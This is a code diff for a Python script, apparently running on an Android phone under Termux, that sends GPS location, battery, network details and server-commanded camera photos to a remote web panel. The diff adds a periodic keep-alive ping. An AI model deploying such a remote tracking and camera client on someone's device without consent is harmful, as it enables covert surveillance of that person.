@@ -9,6 +9,7 @@ from datetime import datetime
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
 URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
+URL_PING = "https://nexos-panel.onrender.com/"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")
 
@@ -35,6 +36,7 @@ ultima_lon = -49.2648
 gps_valido = False
 inicio = datetime.now()
 headers = {"Content-Type": "application/json"}
+ultimo_ping = 0
 
 def obter_rede():
     wifi = run_command("termux-wifi-connectioninfo")
@@ -46,6 +48,18 @@ def obter_rede():
                 return f"WiFi: {ssid}"
         except: pass
     return "Dados Moveis"
+
+def acordar_servidor():
+    """Pinga o site pra acordar o Render se estiver dormindo"""
+    global ultimo_ping
+    agora = time.time()
+    # So pinga a cada 4 minutos
+    if agora - ultimo_ping > 240:
+        try:
+            requests.get(URL_PING, timeout=10)
+        except:
+            pass
+        ultimo_ping = agora
 
 def obter_gps():
     global ultima_lat, ultima_lon, gps_valido
@@ -78,7 +92,7 @@ def enviar_dados():
         "network": rede
     }
     try:
-        r = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers, timeout=5)
+        r = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers, timeout=10)
         if r.status_code == 200:
             return r.json().get("comando_cam", "wait")
     except:
@@ -86,8 +100,7 @@ def enviar_dados():
     return None
 
 def enviar_foto(tipo, num):
-    arq = f"~/nexos_{tipo}.jpg"
-    arq = os.path.expanduser(arq)
+    arq = os.path.expanduser(f"~/nexos_{tipo}.jpg")
     if os.path.exists(arq):
         os.remove(arq)
     
@@ -98,7 +111,7 @@ def enviar_foto(tipo, num):
             with open(arq, "rb") as f:
                 b64 = base64.b64encode(f.read()).decode('utf-8')
             payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": b64}
-            r = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers, timeout=10)
+            r = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers, timeout=15)
             os.remove(arq)
             return r.status_code == 200
     except:
@@ -107,10 +120,13 @@ def enviar_foto(tipo, num):
         os.remove(arq)
     return False
 
-print("🛰️  INICIADO\n")
+print("🛰️  INICIADO COM AUTO-PING\n")
 
 while True:
     t0 = time.time()
+    
+    # ACORDA O RENDER (a cada 4 min)
+    acordar_servidor()
     
     # Bateria
     bat = "N/A"
@@ -120,20 +136,20 @@ while True:
             bat = str(json.loads(out).get("percentage", "N/A"))
         except: pass
     
-    # GPS (roda 1 vez a cada 5 ciclos pra nao travar)
+    # GPS
     obter_gps()
     
     # Rede
     rede = obter_rede()
     
-    # Envia
+    # Envia dados
     comando = enviar_dados()
     
     dt = time.time() - t0
     icone = "📍" if gps_valido else "📡"
     
     if comando is None:
-        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% Offline | {dt:.1f}s")
+        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% Render offline | {dt:.1f}s")
     else:
         print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede} | {dt:.1f}s")
         
